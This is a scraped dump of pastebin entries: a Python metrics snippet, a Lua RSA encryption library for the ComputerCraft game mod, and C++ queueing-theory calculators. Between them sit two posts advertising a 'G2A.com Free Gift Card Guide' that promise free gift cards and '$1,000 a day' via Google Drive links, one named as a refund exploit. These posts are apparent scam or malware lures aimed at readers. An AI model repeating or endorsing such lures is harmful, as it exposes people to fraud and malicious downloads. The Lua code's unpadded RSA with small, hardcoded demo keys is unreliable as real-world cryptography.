accuracy = accuracy_score(y_test, y_pred)
precision = precision_score(y_test, y_pred)
f1 = f1_score(y_test, y_pred)

# V√Ωpis metrik
print(f""Recall: {recall:.4f}"")
print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""F1 Score: {f1:.4f}"")
print(f""Confusion Matrix:\n{conf_matrix}"")

# Zobrazen√≠ confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()"
ptHGndrq,üí∞G2A.com Free Gift Card Guide May 2024üî•,rickyyyyyyy,GetText,Sunday 26th of May 2024 04:44:20 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

You can use this for as long as you want and make 1,000$ a day if you got the time!
 
This is the latest version of this script. Any other one posted will not work!
 
Guide and steps here:
https://drive.google.com/file/d/1DPWAoETZiicqUqNvAVCUYSiXlcVPb6pY/view?usp=sharing
 
Working as of:
27 May 2024"
BckQ1JyV,LUA RSA-Encryption Lib for CC:Tweaked (ComputerCraft),antl1on,Lua,Sunday 26th of May 2024 04:19:16 PM CDT,"RSA_Encrypt = {}
--used for encoding strings to prepare them for encryption
--  the mathematical max is 25, higher numbers will cause an overflow
--  and lead to invalid results.
RSA_Encrypt.max_chars_per_bignum = 25
BigNumAPIPath = ""api/BigNum""
BigNum = require(BigNumAPIPath)


--Usage Information:
--	
--	Tested with 256 bit keys, I wouldn't recommend using keys of 512 or 1024 bit length
--
--	important: You must download the BigNum api from:
--		https://github.com/ennorehling/euler/blob/master/BigNum.lua
--	you can set the path to the BigNum api at the top



--  !!!!!!! VERY IMPORTANT: !!!!!!!
--		after downloading the BigNum api, you must open the file and write:
--			return BigNum	
--		at the end of the file.



--	To use this api, you will first need your key pairs generated by a different program.
--	
--	Load public keys using the loadPublicKeyFrom functions
--	Load private keys using the loadPrivateKeyFrom functions


--	To encrypt a string refer to the encryptStringWith.. functions
--	To decrypt a string refer to the decryptStringWith.. functions

--	Important:
--	use the prepareNumber(msg) function to convert your number
-- 		to the format used in the encrypt/decrypt functions
--	 
--	To encrypt a number, refer to the encryptWith.. functions
--	To decrypt a number, refer to the decryptWith.. functions
--



--############ Begin Functions ############--

--
--	Description:
--		encrypts a string using the public key
--
--	Parameters:
--		msg => String: the msg to be encrypted
--		pub_key => PubKey: the public key
--
--	Returns:
--		String: encrypted message ready for broadcasting
--
function RSA_Encrypt.encryptStringWithPublicKey(msg,pub_key)
	if msg == nil then
		error(""Invalid Parameter #1: msg"")
	end
	if pub_key == nil then
		error(""Invalid Parameter #2: pub_key"")
	end
	local result = """"
	local words = {}
	local bignums = {}
	--split msg into [max_chars_per_bignum]-char strings
	while #msg > RSA_Encrypt.max_chars_per_bignum do
		table.insert(words,msg:sub(1,25))
		msg = msg:sub(26,#msg)
	end
	if #msg > 0 then
		table.insert(words,msg)
	end

	local char_size = BigNum.new(256)
	
	--encode each word into BigNums (bitshift encoding)
	for i=1, #words do
		--for each char in words[i]
		local bignum = BigNum.new()
		for c=1, #words[i] do
			local byte = BigNum.new( string.byte(words[i]:sub(c,c)) )
			bignum = bignum*char_size + byte
		end
		bignum = RSA_Encrypt.encryptWithPublicKey(bignum,pub_key)
		table.insert(bignums, bignum)
		result = result..tostring(bignum).."" ""
	end

	return result
end

--
--	Description:
--		encrypts a string using the private key
--
--	Parameters:
--		msg => String: the msg to be encrypted
--		pub_key => PubKey: the public key
--
--	Returns:
--		String: encrypted message ready for broadcasting
--
function RSA_Encrypt.encryptStringWithPrivateKey(msg,priv_key,pub_key)
	if msg == nil then
		error(""Invalid Parameter #1: msg"")
	end
	if priv_key == nil then
		error(""Invalid Parameter #2: priv_key"")
	end
	if pub_key == nil then
		error(""Invalid Parameter #3: pub_key"")
	end

	local result = """"
	local words = {}
	local bignums = {}
	--split msg into [max_chars_per_bignum]-char strings
	while #msg > RSA_Encrypt.max_chars_per_bignum do
		table.insert(words,msg:sub(1,25))
		msg = msg:sub(26,#msg)
	end
	if #msg > 0 then
		table.insert(words,msg)
	end

	local char_size = BigNum.new(256)
	
	--encode each word into BigNums (bitshift encoding)
	for i=1, #words do
		--for each char in words[i]
		local bignum = BigNum.new()
		for c=1, #words[i] do
			local byte = BigNum.new( string.byte(words[i]:sub(c,c)) )
			bignum = bignum*char_size + byte
		end
		bignum = RSA_Encrypt.encryptWithPrivateKey(bignum,priv_key,pub_key)
		table.insert(bignums, bignum)
		result = result..tostring(bignum).."" ""
		os.sleep(0.001)
	end

	return result
end


--	Description:
--		Decrypts a string (encrypted with a private key) using a public key
--		useful for verifying the message came from a particular sender.
--		because a message encrypted with someone's private key can be decrypted with
--		their public key. Very cool!
--
--	Paramters:
--		msg => String: the encrypted message
--		pub_key => BigNum: the public key n component
--		pub_e => BigNum: the public key e component
--
--	Returns:
--		String: the decrypted message
--
function RSA_Encrypt.decryptStringWithPublicKey(msg,pub_key)
	if msg == nil then
		error(""Invalid Parameter #1: msg"")
	end
	if pub_key == nil then
		error(""Invalid Parameter #2: pub_key"")
	end

	--decode bignum into string
	msg = RSA_Encrypt.splitWords(msg)
	local result = """"
	local bignums = {}

	for i=1, #msg do
		local bignum = BigNum.new(msg[i])
		bignum = RSA_Encrypt.decryptWithPublicKey(bignum,pub_key)
		table.insert(bignums, bignum)
	end

	local char_size = BigNum.new(256)
	local _0 = BigNum.new(0)

	--decode the decrypted bignums into strings (bitshift encoded)
	for i=1, #bignums do
		local word = """"
		while bignums[i] > _0 do
			local tmp = BigNum.new()
			local char = BigNum.new()
			BigNum.div(bignums[i],char_size,tmp,char)
			word = string.char( tonumber(tostring(char)) )..word
			BigNum.copy(tmp,bignums[i])
		end
		result = result..word
		os.sleep(0.001)
	end
	return result
end


--	Description:
--		Decrypts a string (encrypted with a public key) using a private key
--
--	Paramters:
--		msg => String: the encrypted message
--		priv_key => BigNum: the private key.
--		pub_key => PubKey: the public key
--
--	Returns:
--		String: the decrypted message
--
function RSA_Encrypt.decryptStringWithPrivateKey(msg,priv_key,pub_key)
	if msg == nil then
		error(""Invalid Parameter #1: msg"")
	end
	if priv_key == nil then
		error(""Invalid Parameter #2: priv_key"")
	end
	if pub_key == nil then
		error(""Invalid Parameter #3: pub_key"")
	end
	--decode bignum into string
	msg = RSA_Encrypt.splitWords(msg)
	local result = """"
	local bignums = {}

	for i=1, #msg do
		local bignum = BigNum.new(msg[i])
		bignum = RSA_Encrypt.decryptWithPrivateKey(bignum,priv_key,pub_key)
		table.insert(bignums, bignum)
		os.sleep(0.001)
	end

	local char_size = BigNum.new(256)
	local _0 = BigNum.new(0)

	--decode the decrypted bignums into strings (bitshift encoded)
	for i=1, #bignums do
		local word = """"
		while bignums[i] > _0 do
			local tmp = BigNum.new()
			local char = BigNum.new()
			BigNum.div(bignums[i],char_size,tmp,char)
			word = string.char( tonumber(tostring(char)) )..word
			BigNum.copy(tmp,bignums[i])
		end
		result = result..word
	end
	return result
end


--
--	Description:
--		convert public key to a one line string for sending over modems
--
--	Parameters:
--		pub_key => PubKey: the public key
--
--	Returns:
--		String: the public key for broadcasting
--
function RSA_Encrypt.publicKeyToString(_pub_key)
	if _pub_key == nil then
		error(""Invalid Parameter #1: _pub_key"")
	end
	local pub_key = _pub_key[1]
	local pub_e = _pub_key[2]
	local result = tostring(pub_key).."" ""..tostring(pub_e)
	return result
end


--
--  Description:
--		Load public key from path
--		File @ path should contain:
--			RSA n component on first line
--			RSA e component on second line
--
--	Parameter:
--		path => path to file containing RSA public key data
--
--	Returns:
--		pub_key ==> a BigNum RSA n component
--		pub_e   ==> a BigNum RSA e component
--
function RSA_Encrypt.loadPublicKeyFromFile(path)
	if path == nil then
		error(""Invalid Parameter #1: path"")
	end
	if fs.exists(path) then
		local pub_key_file = fs.open(path,""r"")
		local pub_key = pub_key_file.readLine()
		local pub_e = pub_key_file.readLine()
		pub_key = BigNum.new(pub_key)
		pub_e = BigNum.new(pub_e)
		return {pub_key, pub_e}
	else
		error(""pubkey file not found"")
	end
end


--
--	Description:
--		creates and returns the e and n component of an RSA Public Key from a string.
--		the format of the string should be:
--			pub_key.."" ""..pub_e
--		where pub_key is the n component and pub_e is the e component of an RSA Public Key
--		
--	Parameters:
--		str ==> a string containing the public key data
--
--	Returns:
--		pub_key ==> a BigNum, the n component of an RSA Public Key
--		pub_e ==> a BigNum, the e component of an RSA Public Key
--
function RSA_Encrypt.loadPublicKeyFromString(str)
	if str == nil then
		error(""Invalid Parameter #1: str"")
	end
	local words = RSA_Encrypt.splitWords(str)
	local pub_key = BigNum.new(words[1])
	local pub_e = BigNum.new(words[2])
	return {pub_key, pub_e}
end


--
--	Description:
--		Load private key from path
--		File @ path should contain:
--			RSA d component
--
--	Parameter:
--		path => path to file containing RSA private key
--	
--	Returns:
--		priv_key => a BigNum containing the RSA private key found in path
--
function RSA_Encrypt.loadPrivateKeyFromFile(path)
	if path == nil then
		error(""Invalid Parameter #1: path"")
	end
	if fs.exists(path) then
		priv_key_file = fs.open(path,""r"")
		priv_key = priv_key_file.readLine()
		priv_key = BigNum.new(priv_key)
		return priv_key
	else
		error(""privkey file not found"")
	end
end

--
--	Description:
--		Load private key from str
--
--	Parameter:
--		str => a string containing an RSA Private Key (base 10)
--	
--	Returns:
--		priv_key => a BigNum containing the RSA private key found in path
--
function RSA_Encrypt.loadPrivateKeyFromString(str)
	if str == nil then
		error(""Invalid Parameter #1: str"")
	end
	priv_key = BigNum.new(str)
	return priv_key
end

--
--	Description:
--		Encrypt msg with a given public key
--
--	Parameters:
--		msg ==> a BigNum to be encrypted
--		pub_key ==> a BigNum, the n component of RSA pub key
--		pub_e ==> a BigNum, the e component of RSA pub key
--	
--	Returns:
--		a BigNum: msg encrypted with the pub key
--
function RSA_Encrypt.encryptWithPublicKey(msg, _pub_key)
	if msg == nil then
		error(""Invalid Parameter #1: msg"")
	end
	if _pub_key == nil then
		error(""Invalid Parameter #2: _pub_key"")
	end
	local pub_key = _pub_key[1]
	local pub_e = _pub_key[2]
	local result = RSA_Encrypt.BigNumModPow(msg, pub_e, pub_key)
	return result
end


--
--	Description:
--		Encrypt msg with a given private key
--
--	Parameters:
--		msg ==> a BigNum to be encrypted
--		priv_key ==> a BigNum, the RSA private key
--		pub_key ==> a BigNum, the n component of RSA public key
--	
--	Returns:
--		a BigNum: msg encrypted with the pub key
--
function RSA_Encrypt.encryptWithPrivateKey(msg, priv_key, _pub_key)
	if msg == nil then
		error(""Invalid Parameter #1: msg"")
	end
	if priv_key == nil then
		error(""Invalid Parameter #2: priv_key"")
	end
	if _pub_key == nil then
		error(""Invalid Parameter #3: _pub_key"")
	end
	local pub_key = _pub_key[1]
	local result = RSA_Encrypt.BigNumModPow(msg, priv_key, pub_key)
	return result
end


--
--  Description:
--		decrypt msg (encrypted with a public key) using the private key
--
--	Parameters:
--		msg ==> a BigNum, the msg to be decrypted
--		priv_key ==> a BigNum, the RSA private key
--		pub_key ==> PubKey: the public key
--
--	Returns:
--		a BigNum, the decrypted msg
--		
function RSA_Encrypt.decryptWithPrivateKey(msg, priv_key, _pub_key)
	if msg == nil then
		error(""Invalid Parameter #1: msg"")
	end
	if priv_key == nil then
		error(""Invalid Parameter #2: priv_key"")
	end
	if _pub_key == nil then
		error(""Invalid Parameter #3: _pub_key"")
	end
	local pub_key = _pub_key[1]
	local result = RSA_Encrypt.BigNumModPow(msg, priv_key, pub_key)
	return result
end


--
--	Description:
--		decrypt msg (encrypted with a private key) using the public key
--
--	Parameters:
--		msg ==> a BigNum, the msg to be decrypted
--		_pub_key ==> a BigNum, the n component of an RSA Public Key
--		
--	Returns:
--		the decrypted message in msg.
function RSA_Encrypt.decryptWithPublicKey(msg, _pub_key)
	if msg == nil then
		error(""Invalid Parameter #1: msg"")
	end
	if _pub_key == nil then
		error(""Invalid Parameter #2: _pub_key"")
	end
	local pub_key = _pub_key[1]
	local pub_e = _pub_key[2]
	local result = RSA_Encrypt.BigNumModPow(msg, pub_e, pub_key)
	return result
end


--
--	Description:
--		creates and returns a BigNum from msg
--
--	Parameter:
--		msg ==> a string containing an integer (base 10) OR an int
--
--	Returns:
--		a BigNum, the integer contained in msg
--
function RSA_Encrypt.prepareNumber(num)
	if num == nil then
		error(""Invalid Parameter #1: num"")
	end
	local result = BigNum.new(num)
	return result
end


--
--	Description:
--		returns num^exponent % modulo
--
--  Parameters:
--		b = a BigNum to be modpow-ed
--		e = a BigNum exponent
--		m = a BigNum modulo
--
--	Returns:
--		a BigNum == (base^exponent) % modulo
--
function RSA_Encrypt.BigNumModPow(b, e, m)
	if b == nil then
		error(""Invalid Parameter #1: b"")
	end
	if e == nil then
		error(""Invalid Parameter #2: e"")
	end
	if m == nil then
		error(""Invalid Parameter #3: m"")
	end
	base = BigNum.new()
	exponent = BigNum.new()
	modulo = BigNum.new()
	BigNum.copy(b, base)
	BigNum.copy(e, exponent)
	BigNum.copy(m, modulo)
	--represent 0, 1, and 2 as BigNums
	local _2 = BigNum.new(""2"")
	local _1 = BigNum.new(""1"")
	local _0 = BigNum.new(""0"")

	--if base == 1
	if BigNum.eq(base,_1) then
		return 0
	end
	local r = BigNum.new(""1"")

	--base = base % modulo
	local tmp = BigNum.new()
	local tmp_res = BigNum.new()
	local tmp_res_2 = BigNum.new()

	--base = base % modulo
	BigNum.div(base, modulo, tmp, tmp_res)
	BigNum.copy(tmp_res,base)

	--while exponent > 0
	while (BigNum.compare(exponent, _0) == 1) do

		--if exponent % 2 == 1 then
		BigNum.div(exponent, _2, tmp, tmp_res)
		if (BigNum.compare(tmp_res, _1) == 0) then

			--r = (r*base) % modulo
			BigNum.mul(r,base,tmp_res)
			BigNum.div(tmp_res,modulo,tmp,tmp_res_2)
			BigNum.copy(tmp_res_2,r)
		end

		-- base = (base*base) % m
		BigNum.mul(base,base,tmp_res)
		BigNum.div(tmp_res,modulo,tmp,tmp_res_2)
		BigNum.copy(tmp_res_2,base)

		-- e = math.floor(e/2)
		BigNum.div(exponent,_2,tmp_res,tmp)
		BigNum.copy(tmp_res,exponent)
	end
	return r
end


--
--	a helper function used by RSA_Encrypt.loadPublicKeyFromString(str)
--
function RSA_Encrypt.splitWords(s)
	if s == nil then
		error(""Invalid Parameter #1: s"")
	end
    local words = {}
    local j = 1
    local btoi = {[true]=1,[false]=0}
    for i = 1, #s do 
        b = i ~= #s
        if string.sub(s,i,i) == "" "" or not b then
            words[#words+1] = string.sub(s,j,i-1*btoi[b])
            j=i+1 
        end  
    end
    return words
end

--
--	Run a benchmark of the encryStringWith and decryptStringWith functions
--
--	Paramter: str => (Optional) the string to run the benchmark on
--
function RSA_Encrypt.benchmark(str)
	print(""\nRunning Benchmark using:"")
	if str == nil then
		str = ""Hello world! This is the default benchmark string. You can run the benchmark with a custom string by adding it to the call parameters""
	end
	print(str..""\n"")

	local priv_key = BigNum.new(""30718027764395347858436300176794542038442961471507061849584361239819342178987"")
	local pub_key = RSA_Encrypt.loadPublicKeyFromString(""18430816658637208715061780106076725223340967021069964147042057987714753676151 3"")

	--
	print(""Encrypting with public key:"")
	local start = os.epoch(""utc"")
	local cipher = RSA_Encrypt.encryptStringWithPublicKey(str,pub_key)
	local endd = os.epoch(""utc"")
	local dist = endd-start
	print(""  took"",dist,""ms"")

	print(""Decrypting with private key:"")
	local start = os.epoch(""utc"")
	local decipher = RSA_Encrypt.decryptStringWithPrivateKey(cipher,priv_key,pub_key)
	if decipher == str then
		print(""  success!"")
	else
		print(""  failed!!"")
		print(""  got:""..decipher)
	end
	local endd = os.epoch(""utc"")
	local dist = endd-start
	print(""  took"",dist,""ms"")

	print(""\nEncrypting with private key:"")
	local start = os.epoch(""utc"")
	local cipher = RSA_Encrypt.encryptStringWithPrivateKey(str,priv_key,pub_key)
	local endd = os.epoch(""utc"")
	local dist = endd-start
	print(""  took"",dist,""ms"")

	print(""Decrypting with public key:"")
	local start = os.epoch(""utc"")
	local decipher = RSA_Encrypt.decryptStringWithPublicKey(cipher,pub_key)
	if decipher == str then
		print(""  success!"")
	else
		print(""  failed!!"")
		print(""  got:""..decipher)
	end
	local endd = os.epoch(""utc"")
	local dist = endd-start
	print(""  took"",dist,""ms"")

	-- print(""\nencrypting:"")
	-- print(str)
	-- local cipher = RSA_Encrypt.encryptStringWithPublicKey(str,pub_key)
	-- print(cipher)
	-- print(""\ndeciphering"")
	-- local decipher = RSA_Encrypt.decryptStringWithPrivateKey(cipher,priv_key,pub_key)
	-- print(decipher)

	-- print(""\nencrypting:"")
	-- print(str)
	-- local cipher = RSA_Encrypt.encryptStringWithPrivateKey(str,priv_key,pub_key)
	-- print(cipher)
	-- print(""\ndeciphering"")
	-- local decipher = RSA_Encrypt.decryptStringWithPublicKey(cipher,pub_key)
	-- print(decipher)
end

return RSA_Encrypt"
LLxSdzSb,üí∞G2A.com Free Gift Card Guide May 2024üî•,dustinction,GetText,Sunday 26th of May 2024 03:47:20 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4691089.pdf

Working as of:

26 May 2024"
4hFCixaA,Untitled,575,C++,Sunday 26th of May 2024 03:38:48 PM CDT,"#include <iostream>
#include <vector>
#include <cmath>
#include <iomanip>

using namespace std;

void print_params(map<string, double> &params) {
    for (auto &arg : params) {
        cout << arg.first << "" = "" << arg.second << endl;
    }
}

int main() {
    double t_oj = 7;
    double t_obs = 6.5;

    double t_inQ = 0.6;
    double mu = 1 / t_obs;
    double lmbd = 1 / t_oj;
    double rho = lmbd / mu;
    double omega = 1 / t_inQ;
    double beta = omega / mu;

    cout << fixed << setprecision(6);
    cout << ""mu = "" << mu << endl;
    cout << ""lmbd = "" << lmbd << endl;
    cout << ""omega = "" << omega << endl;
    cout << ""t_obs = "" << t_obs << endl;
    cout << ""t_oj = "" << t_oj << endl;
    cout << ""t_inQ = "" << t_inQ << endl;
    cout << ""rho = "" << rho << endl;
    cout << ""beta = "" << beta << endl;

    int n = 1;
    cout << ""n = "" << n << endl;

    auto get_params_limited_waiting = [](int n, double mu, double lmbd, double beta, double rho) {
        map<string, double> params;
        vector<double> p(1, 0);
        for (int i = 0; i <= n; ++i) {
            p[0] += pow(rho, i) / tgamma(i + 1);
        }
        vector<double> denominators(1, n + beta);
        for (int i = 1; i < 10; ++i) {
            denominators.push_back(denominators[i - 1] * (n + i * beta));
        }
        double tmp = 0;
        for (int i = 0; i < 10; ++i) {
            tmp += pow(rho, i + 1) / denominators[i];
        }
        p[0] = pow(p[0] + pow(rho, n) / tgamma(n + 1) * tmp, -1);
        for (int i = 1; i <= n; ++i) {
            p.push_back(pow(rho, i) / tgamma(i + 1) * p[0]);
        }
        for (int i = 0; i < 10; ++i) {
            p.push_back(pow(rho, n) / tgamma(n + 1) * pow(rho, i + 1) / denominators[i] * p[0]);
        }
        params[""p""] = p[0]; // Only storing the first p value
        double k = n;
        for (int i = 0; i <= n; ++i) {
            k -= (n - i) * p[i];
        }
        params[""k""] = k;
        params[""P_och""] = 1;
        for (int i = 0; i <= n; ++i) {
            params[""P_och""] -= p[i];
        }
        params[""P_ob""] = k / rho;
        params[""P_otk""] = 0;
        params[""P_syst""] = 1;
        params[""Q""] = params[""P_ob""];
        params[""A""] = lmbd * params[""Q""];
        params[""L_ob""] = k;
        params[""L_och""] = (rho - k) / beta;
        params[""L_syst""] = params[""L_ob""] + params[""L_och""];
        params[""P_uh""] = 1 - params[""P_ob""];
        params[""nu_uh""] = lmbd - mu * k;
        params[""T_ob""] = params[""L_ob""] / lmbd;
        params[""T_och""] = params[""L_och""] / lmbd;
        params[""T_syst""] = params[""L_syst""] / lmbd;

        return params;
    };

    print_params(get_params_limited_waiting(n, mu, lmbd, beta, rho));

    n = 3;
    cout << ""n = "" << n << endl;

    print_params(get_params_limited_waiting(n, mu, lmbd, beta, rho));

    n = 1;
    int i = 4;

    cout << ""n = "" << n << endl;
    cout << ""i = "" << i << endl;

    auto get_params_closed = [](int n, double mu, double lmbd, double rho, int i) {
        map<string, double> params;
        vector<double> p(1, 0);
        for (int k = 0; k <= n; ++k) {
            p[0] += tgamma(i + 1) / tgamma(i - k + 1) * pow(rho, k) / tgamma(k + 1);
        }
        for (int k = n + 1; k <= i; ++k) {
            p[0] += pow(rho, n) / tgamma(n + 1) * tgamma(i + 1) / tgamma(i - k + 1) * pow(rho, k - n) / pow(n, k - n);
        }
        p[0] = pow(p[0], -1);
        for (int k = 1; k <= n; ++k) {
            p.push_back(tgamma(i + 1) / tgamma(i - k + 1) * pow(rho, k) / tgamma(k + 1) * p[0]);
        }
        for (int k = n + 1; k <= i; ++k) {
            p.push_back(tgamma(i + 1) / tgamma(i - k + 1) * pow(rho, k) / (tgamma(n + 1) * pow(n, k - n)) * p[0]);
        }
        params[""p""] = p[0]; // Only storing the first p value
        double k = n;
        for (int j = 0; j <= n; ++j) {
            k -= (n - j) * p[j];
        }
        params[""k""] = k;
        params[""P_och""] = 0;
        for (int j = n + 1; j <= i; ++j) {
            params[""P_och""] += p[0] * pow(rho, n) / tgamma(n + 1) * tgamma(i + 1) / tgamma(i - j + 1) * pow(rho, j - n) / pow(n, j - n);
        }
        params[""P_ob""] = 1;
        params[""P_otk""] = 0;
        params[""P_syst""] = 1;
        params[""Q""] = 1;
        params[""A""] = mu * k;
        params[""L_ob""] = k;
        params[""L_och""] = i - k * (1 / rho + 1);
        params[""L_syst""] = params[""L_ob""] + params[""L_och""];
        params[""N_akt""] = params[""A""] / lmbd;
        params[""N_pas""] = i - params[""N_akt""];
        params[""nu""] = params[""A""];
        params[""P_akt""] = params[""N_akt""] / i;
        params[""T_ob""] = params[""L_ob""] / params[""nu""];
        params[""T_och""] = params[""L_och""] / params[""nu""];
        params[""T_syst""] = params[""L_syst""] / params[""nu""];

        return params;
    };

    print_params(get_params_closed(n, mu, lmbd, rho, i));

    n = 3;
    cout << ""n = "" << n << endl;

    print_params(get_params_closed(n, mu, lmbd, rho, i));

    n = 4;
    cout << ""n = "" << n << endl;

    auto get_params_rejections = [](int n, double mu, double lmbd, double rho) {
        map<string, double> params;
        vector<double> p(1, 1);
        for (int i = 1; i <= n; ++i) {
            p[0] += pow(rho, i) / tgamma(i + 1);
        }
        p[0] = pow(p[0], -1);
        for (int i = 1; i <= n; ++i) {
            p.push_back(pow(rho, i) / tgamma(i + 1) * p[0]);
        }
        params[""p""] = p[0];
        params[""P_otk""] = p.back();
        params[""Q""] = 1 - params[""P_otk""];
        params[""A""] = lmbd * params[""Q""];
        params[""k""] = params[""A""] / mu;
        params[""L_ob""] = params[""A""] / mu;
        params[""T_ob""] = params[""L_ob""] / lmbd;

        return params;
    };

    auto get_params_rejections_plus = [](int n, double mu, double lmbd, double rho) {
        map<string, double> params;
        vector<double> p = {n / (rho + n), rho / (rho + n)};
        params[""p+""] = p[0]; // Only storing the first p value
        params[""P_otk+""] = p[1];
        params[""Q+""] = 1 - params[""P_otk+""];
        params[""A+""] = lmbd * params[""Q+""];
        params[""k+""] = params[""A+""] / mu;
        params[""L_ob+""] = p[1];
        params[""T_ob+""] = params[""L_ob+""] / lmbd;

        return params;
    };

    print_params(get_params_rejections(n, mu, lmbd, rho));
    print_params(get_params_rejections_plus(n, mu, lmbd, rho));

    n = 3;
    double psi = rho / n;

    cout << ""n = "" << n << endl;
    cout << ""psi = rho/n = "" << psi << endl;

    auto get_params_endless_queue = [](int n, double mu, double lmbd, double rho) {
        map<string, double> params;
        vector<double> p(1, 1);
        for (int i = 1; i <= n; ++i) {
            p[0] += pow(rho, i) / tgamma(i + 1);
        }
        p[0] += pow(rho, n + 1) / (tgamma(n + 1) * (n - rho));
        p[0] = pow(p[0], -1);
        for (int i = 1; i <= n; ++i) {
            p.push_back(pow(rho, i) / tgamma(i + 1) * p[0]);
        }
        for (int i = 1; i < 150; ++i) {
            p.push_back(pow(rho, n + i) / (tgamma(n + 1) * pow(n, i)) * p[0]);
        }
        params[""p""] = p[0]; // Only storing the first p value
        params[""P_och""] = pow(rho, n + 1) * p[0] / (tgamma(n + 1) * (n - rho));
        params[""P_otk""] = 0;
        params[""Q""] = 1 - params[""P_otk""];
        params[""A""] = lmbd * params[""Q""];
        params[""k""] = params[""A""] / mu;
        params[""L_ob""] = params[""A""] / mu;
        params[""L_och""] = n * params[""P_och""] / (n - rho);
        params[""L_syst""] = params[""L_ob""] + params[""L_och""];
        params[""T_ob""] = params[""L_ob""] / lmbd;
        params[""T_och""] = params[""L_och""] / lmbd;
        params[""T_syst""] = params[""L_syst""] / lmbd;

        return params;
    };

    auto get_params_endless_queue_plus = [](int n, double lmbd, double rho, double psi) {
        map<string, double> params;
        vector<double> p = {1 - psi};
        for (int i = 1; i < 10; ++i) {
            p.push_back(pow(psi, i) * (1 - psi));
        }
        params[""p+""] = p[0];
        params[""P_och+""] = pow(psi, 2);
        params[""P_otk+""] = 0;
        params[""Q+""] = 1;
        params[""A+""] = lmbd;
        params[""k+""] = rho;
        params[""L_ob+""] = psi;
        params[""L_och+""] = pow(psi, 2) / (1 - psi);
        params[""L_syst+""] = params[""L_ob+""] + params[""L_och+""];
        params[""T_ob+""] = params[""L_ob+""] / lmbd;
        params[""T_och+""] = params[""L_och+""] / lmbd;
        params[""T_syst+""] = params[""L_syst+""] / lmbd;

        return params;
    };

    print_params(get_params_endless_queue(n, mu, lmbd, rho));
    print_params(get_params_endless_queue_plus(n, lmbd, rho, psi));

    n = 2;
    int m = 4;
    psi = rho / n;

    cout << ""n = "" << n << endl;
    cout << ""m = "" << m << endl;
    cout << ""psi = rho/n = "" << psi << endl;

    auto get_params_limited_queue = [](int n, int m, double mu, double lmbd, double rho) {
        map<string, double> params;
        vector<double> p(1, 1);
        for (int i = 1; i <= n; ++i) {
            p[0] += pow(rho, i) / tgamma(i + 1);
        }
        p[0] += pow(rho, n + 1) * (1 - pow(rho / n, m)) / (tgamma(n + 1) * n * (1 - rho / n));
        p[0] = pow(p[0], -1);
        for (int i = 1; i <= n; ++i) {
            p.push_back(pow(rho, i) / tgamma(i + 1) * p[0]);
        }
        for (int i = 1; i <= m; ++i) {
            p.push_back(pow(rho, n + i) / (tgamma(n + 1) * pow(n, i)) * p[0]);
        }
        params[""p""] = p[0]; // Only storing the first p value
        params[""P_och""] = pow(rho, n + 1) * (1 - pow(rho / n, m)) / (tgamma(n + 1) * n * (1 - rho / n)) * p[0];
        params[""P_otk""] = pow(rho, n + m) / (pow(n, m) * tgamma(n + 1)) * p[0];
        params[""Q""] = 1 - params[""P_otk""];
        params[""A""] = lmbd * params[""Q""];
        params[""k""] = params[""A""] / mu;
        params[""L_ob""] = params[""A""] / mu;
        params[""L_och""] = pow(rho, n + 1) / (n * tgamma(n + 1)) * (1 - pow(rho / n, m) * (m + 1 - m * rho / n)) / pow(1 - rho / n, 2) * p[0];
        params[""L_syst""] = params[""L_ob""] + params[""L_och""];
        params[""T_ob""] = params[""L_ob""] / lmbd;
        params[""T_och""] = params[""L_och""] / lmbd;
        params[""T_syst""] = params[""L_syst""] / lmbd;

        return params;
    };

    auto get_params_limited_queue_plus = [](int n, int m, double lmbd, double psi) {
        map<string, double> params;
        vector<double> p = {(1 - psi) / (1 - pow(psi, m + 2))};
        for (int i = 1; i <= m + 1; ++i) {
            p.push_back(pow(psi, i) * p[0]);
        }
        params[""p+""] = p[0]; // Only storing the first p value
        params[""P_och+""] = pow(psi, 2) * (1 - pow(psi, m)) / (1 - pow(psi, m + 2));
        params[""P_otk+""] = pow(psi, m + 1) * (1 - psi) / (1 - pow(psi, m + 2));
        params[""Q+""] = 1 - params[""P_otk+""];
        params[""A+""] = lmbd * params[""Q+""];
        params[""k+""] = n * psi * (1 - pow(psi, m + 1)) / (1 - pow(psi, m + 2));
        params[""L_ob+""] = psi * params[""Q+""];
        params[""L_och+""] = pow(psi, 2) * (1 - pow(psi, m) * (m + 1 - m * psi)) / ((1 - pow(psi, m + 2)) * (1 - psi));
        params[""L_syst+""] = params[""L_ob+""] + params[""L_och+""];
        params[""T_ob+""] = params[""L_ob+""] / lmbd;
        params[""T_och+""] = params[""L_och+""] / lmbd;
        params[""T_syst+""] = params[""L_syst+""] / lmbd;

        return params;
    };

    print_params(get_params_limited_queue(n, m, mu, lmbd, rho));
    print_params(get_params_limited_queue_plus(n, m, lmbd, psi));

    return 0;
}
"
XcMeNudu,Untitled,575,C++,Sunday 26th of May 2024 03:36:17 PM CDT,"#include <iostream>
#include <vector>
#include <cmath>

using namespace std;

void print_params(const vector<pair<string, double>>& params) {
    for (const auto& param : params) {
        cout << param.first << "" = "" << param.second << endl;
    }
}

vector<pair<string, double>> get_params_rejections(int n, double mu, double lmbd, double rho, double income_unit, double expenses_unit) {
    vector<pair<string, double>> params;
    vector<double> p = {1};
    for (int i = 1; i <= n; ++i) {
        p[0] += pow(rho, i) / tgamma(i + 1);
    }
    p[0] = pow(p[0], -1);
    for (int i = 1; i <= n; ++i) {
        p.push_back(pow(rho, i) / tgamma(i + 1) * p[0]);
    }
    params.push_back({""P_otk"", p.back()});
    params.push_back({""Q"", 1 - p.back()});
    double A = lmbd * (1 - p.back());
    params.push_back({""A"", A});
    params.push_back({""L_ob"", A / mu});
    params.push_back({""k_zag"", (A / mu) / n});
    params.push_back({""economic_efficiency"", income_unit * A - expenses_unit * n});

    return params;
}

vector<pair<string, double>> get_params_endless_queue(int n, double mu, double lmbd, double rho, double income_unit, double expenses_unit) {
    vector<pair<string, double>> params;
    vector<double> p = {1};
    for (int i = 1; i <= n; ++i) {
